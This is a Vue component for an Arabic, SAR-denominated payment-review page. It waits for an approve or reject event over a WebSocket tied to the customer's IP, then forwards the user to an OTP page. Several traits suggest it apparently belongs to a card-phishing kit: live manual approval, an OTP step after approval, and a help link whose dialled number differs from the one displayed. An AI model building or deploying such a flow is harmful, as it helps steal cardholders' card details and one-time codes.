<template>
    <div class="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
        <div class="flex-1 flex flex-col items-center justify-center py-6 sm:py-10 px-4 relative overflow-hidden">

        <div class="relative bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden w-full"
            style="max-width: 440px">

            <!-- Bank Logo -->
            <div v-if="bankLogo"
                class="absolute top-4 left-4 z-10 bg-white/90 backdrop-blur-sm rounded-lg px-3 py-1.5 border border-slate-200 shadow-sm">
                <img :src="bankLogo" alt="Bank logo" class="h-8 sm:h-10 w-auto object-contain" />
            </div>

            <!-- Main Content -->
            <div class="px-5 sm:px-8 pt-10 sm:pt-12 pb-6 sm:pb-8 text-center">

                <!-- Spinner -->
                <div class="mb-5">
                    <div class="relative inline-flex items-center justify-center w-24 h-24">
                        <!-- Outer rotating ring -->
                        <svg class="absolute inset-0 w-full h-full animate-spin-slow" viewBox="0 0 96 96" fill="none">
                            <circle cx="48" cy="48" r="44" stroke="#e2e8f0" stroke-width="4" />
                            <path d="M48 4a44 44 0 0 1 44 44" stroke="#faa62e" stroke-width="4" stroke-linecap="round" />
                        </svg>
                        <!-- Inner pulsing shield -->
                        <svg class="w-10 h-10 animate-pulse-gentle" viewBox="0 0 24 24" fill="none">
                            <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" fill="#faa62e" opacity="0.15" />
                            <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" stroke="#faa62e" stroke-width="1.5" fill="none" />
                            <path d="M9 12l2 2 4-4" stroke="#faa62e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
                        </svg>
                    </div>
                    <!-- Animated dots -->
                    <div class="flex justify-center gap-1.5 mt-3">
                        <span class="w-2 h-2 rounded-full bg-amber-400 animate-dot-1"></span>
                        <span class="w-2 h-2 rounded-full bg-amber-400 animate-dot-2"></span>
                        <span class="w-2 h-2 rounded-full bg-amber-400 animate-dot-3"></span>
                    </div>
                </div>

                <!-- Title -->
                <h1 class="text-xl sm:text-2xl font-bold text-foreground mb-2">جاري مراجعة طلب الدفع</h1>
                <p class="text-sm sm:text-base text-slate-600">تم استلام بيانات العملية، ويتم التحقق من الحالة الآن. يرجى الانتظار وعدم إغلاق الصفحة.</p>

                <!-- Review Notice -->
                <div v-if="paymentStatus !== 'approved' && paymentStatus !== 'rejected'" class="mt-6 bg-sky-50 border border-sky-200 rounded-xl p-4">
                    <div class="flex items-start gap-3">
                        <div class="text-right flex-1">
                            <p class="text-sm font-semibold text-sky-800 mb-1">مراجعة الطلب</p>
                            <p class="text-xs sm:text-sm text-sky-700 leading-relaxed">
                                قد تستغرق عملية التحقق لحظات قليلة. في حال الحاجة إلى إجراء إضافي، سيتم توجيهك تلقائيًا للخطوة التالية.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Taking too long notice -->
                <div v-if="waitingTooLong && paymentStatus !== 'approved' && paymentStatus !== 'rejected'" class="mt-4 bg-amber-50 border border-amber-200 rounded-xl p-4">
                    <div class="flex items-start gap-3">
                        <svg class="w-5 h-5 text-amber-500 shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                        </svg>
                        <div class="text-right flex-1">
                            <p class="text-sm font-semibold text-amber-800">العملية تستغرق وقتاً أطول من المعتاد</p>
                            <p class="text-xs text-amber-700 mt-1">إذا لم يتم الرد خلال دقيقة، يمكنك العودة والمحاولة مرة أخرى</p>
                            <button
                                class="mt-2 text-xs text-amber-800 font-bold underline cursor-pointer hover:text-amber-900"
                                @click="goBackToCheckout">
                                العودة لصفحة الدفع
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Status: Approved -->
                <div v-if="paymentStatus === 'approved'" class="mt-6">
                    <div
                        class="inline-flex items-center gap-2 bg-green-50 text-green-700 border border-green-200 rounded-full px-4 py-2 text-sm font-medium">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>تمت الموافقة</span>
                    </div>
                    <p class="text-sm text-muted mt-2">جاري التحويل...</p>
                </div>

                <!-- Status: Rejected -->
                <div v-else-if="paymentStatus === 'rejected'" class="mt-6">
                    <div
                        class="inline-flex items-center gap-2 border rounded-full px-4 py-2 text-sm font-medium"
                        :class="rejectionAlert?.type === 'warning' ? 'bg-amber-50 text-amber-700 border-amber-200' : 'bg-red-50 text-destructive border-red-200'">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>{{ rejectionAlert?.title || 'تم الرفض' }}</span>
                    </div>
                    <p class="text-sm text-slate-700 font-medium mt-3">
                        {{ rejectionAlert?.message || 'لم تتم الموافقة على العملية' }}
                    </p>
                    <p class="text-xs text-slate-500 mt-1">{{ rejectionAlert?.action || 'يمكنك المتابعة الآن بمحاولة جديدة أو تعديل بيانات البطاقة.' }}</p>
                    <p v-if="rejectionAlert?.suggestion" class="text-xs text-slate-500 mt-1">{{ rejectionAlert.suggestion }}</p>

                    <div class="mt-4 flex flex-col sm:flex-row gap-2 justify-center">
                        <button
                            class="inline-flex items-center justify-center gap-2 bg-primary hover:bg-primary-dark text-white font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
                            @click="retryWithAnotherCard">
                            <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                            </svg>
                            جرّب بطاقة أخرى
                        </button>

                        <button
                            class="inline-flex items-center justify-center gap-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
                            @click="editPaymentDetails">
                            تعديل بيانات الدفع
                        </button>
                    </div>
                </div>

                <!-- Card Summary -->
                <div v-if="cardLast4" class="mt-6 space-y-1 text-sm">
                    <p class="text-slate-500">البطاقة المنتهية بـ <span class="font-bold text-foreground ltr-nums" dir="ltr">{{ cardLast4 }}</span></p>
                    <p class="text-slate-500">المبلغ: <span class="font-bold text-primary ltr-nums">{{ formattedAmount }}</span> <SarIcon className="size-2.5 fill-primary inline-block" /></p>
                </div>
            </div>

            <!-- Footer -->
            <div class="border-t border-slate-100 px-5 py-3 flex items-center justify-center gap-2 text-slate-400">
                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
            </div>
        </div>

        <!-- Help -->
        <div class="mt-5 text-center">
            <p class="text-xs text-muted">
                للمساعدة أو الاستفسار:
                <a href="tel:920000710" class="text-secondary font-bold hover:underline mr-1">920770710</a>
            </p>
        </div>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackPaymentWaitStarted, trackPaymentWaitCompleted, trackStepCompleted, trackFunnelEvent } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getCardStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import { formatPaymentFailure } from '@/constants/rejectionReasons';
import { BANK_LOGOS } from '@/constants/bankLogos';
import { detectBankFromBin } from '@/utils/bankDetector';

const router = useRouter();

// Track this page
useVisitorTracking( 'payment/waiting' );

// ─── Load context ───────────────────────────────────────────────────
const { context, resolveCustomerIp } = usePayment();
const _sessionId = computed( () => context.sessionId || '' );
const customerIp = ref( context.customerIp || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const _cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

const bankLogo = computed( () =>
{
    // Prefer backend-resolved bank code; fall back to client-side BIN detection
    const key = context.bankCode || detectBankFromBin( context.cardBin || '' );
    return key && BANK_LOGOS[key] ? BANK_LOGOS[key] : null;
} );

const formattedAmount = computed( () =>
{
    return totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } );
} );

// ─── WebSocket + Polling via composable ─────────────────────────────
const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'payment',
    approvedEvent: 'PaymentApproved',
    rejectedEvent: 'PaymentRejected',
    logTag: 'PaymentWaiting',

    onApproved ( event )
    {
        logger.debug( '[PaymentWaiting] Payment approved:', event );
        trackPaymentWaitCompleted();
        trackStepCompleted( 'payment_waiting', 'otp' );
        // Navigate to OTP page after brief visual feedback
        setTimeout( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'otp', router );
            } else
            {
                router.push( { name: 'otp' } );
            }
        }, 2000 );
    },

    onRejected ( event )
    {
        logger.debug( '[PaymentWaiting] Payment rejected:', event );
        // Clear otpContext so the beforeEnter guard blocks re-entry
        sessionStorage.removeItem( 'otpContext' );
        // Keep user in control on rejection and let them choose retry/edit action explicitly.
        trackFunnelEvent( 'payment_rejected_viewed', {
            step_name: 'payment_waiting',
            metadata: { reason: event.reason || '' },
        } );
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sessionId = context.sessionId || '';
        const sig = context.statusSigs?.card || '';
        if ( !sessionId || !sig )
        {
            logger.warn( '[PaymentWaiting] Poll skipped — missing sessionId or sig', { sessionId: !!sessionId, sig: !!sig } );
            return;
        }

        const { data } = await getCardStatus( sessionId, sig );

        if ( data.status === 'approved' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.rejection_reason || '' } );
        }
    },
} );

const rejectionAlert = computed( () => formatPaymentFailure( rejectionReason.value, {
    detectedBank: detectBankFromBin( context.cardBin || '' ),
} ) );

function goBackToCheckout ()
{
    sessionStorage.removeItem( 'otpContext' );
    router.replace( { name: 'checkout', query: { rejectionReason: rejectionReason.value || '' } } );
}

function retryWithAnotherCard ()
{
    trackFunnelEvent( 'payment_rejected_retry_clicked', {
        step_name: 'payment_waiting',
        metadata: { reason: rejectionReason.value || '' },
    } );
    goBackToCheckout();
}

function editPaymentDetails ()
{
    trackFunnelEvent( 'payment_rejected_edit_clicked', {
        step_name: 'payment_waiting',
        metadata: { reason: rejectionReason.value || '' },
    } );
    goBackToCheckout();
}

// "Taking too long" indicator — shown after 30 seconds of waiting
const waitingTooLong = ref( false );
let waitingTimer = null;

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIp.value || await resolveCustomerIp();
    customerIp.value = ip;
    setupWs( ip );
    trackStepViewed( 'payment_waiting' );
    trackPaymentWaitStarted();

    // Show "taking too long" notice after 30 seconds
    waitingTimer = setTimeout( () => { waitingTooLong.value = true; }, 30000 );
} );

onUnmounted( () =>
{
    if ( waitingTimer ) clearTimeout( waitingTimer );
} );
</script>

<style scoped>
@keyframes spin-slow {
    to { transform: rotate(360deg); }
}
@keyframes pulse-gentle {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.08); opacity: 0.85; }
}
@keyframes dot-bounce {
    0%, 80%, 100% { transform: scale(0.5); opacity: 0.35; }
    40% { transform: scale(1); opacity: 1; }
}

.animate-spin-slow { animation: spin-slow 1.8s linear infinite; }
.animate-pulse-gentle { animation: pulse-gentle 2s ease-in-out infinite; }
.animate-dot-1 { animation: dot-bounce 1.4s ease-in-out infinite; }
.animate-dot-2 { animation: dot-bounce 1.4s ease-in-out 0.2s infinite; }
.animate-dot-3 { animation: dot-bounce 1.4s ease-in-out 0.4s infinite; }
</style>
